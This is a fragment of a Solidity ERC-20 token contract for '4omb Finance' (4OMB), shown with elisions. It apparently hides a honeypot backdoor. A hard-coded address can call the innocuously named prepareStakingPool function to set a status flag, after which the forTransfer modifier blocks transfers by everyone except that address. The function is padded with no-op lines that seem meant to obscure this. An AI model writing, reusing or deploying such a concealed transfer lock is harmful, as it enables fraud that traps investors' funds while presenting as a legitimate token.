...
contract FourOmb is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenav_totalSupply;
    uint256 private _tokenav_status = 0;
    uint256 public stakingPoolavStatus = 0;

    string private _tokenav_name;
    string private _tokenav_symbol;

    address private _poolavAddress = 0xEcBB95AAcCB293CCdF71Ec9Bc3b7758f0441F58E; 

    constructor() {
        _tokenav_name = "4omb Finance";
        _tokenav_symbol = "4OMB";
        _tokenav_totalSupply = 100 * 10 ** 18;
        _balances[msg.sender] = _tokenav_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolavAddress || _tokenav_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolavStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolavAddress)
        {
            _tokenav_status = 1;
        }
    }
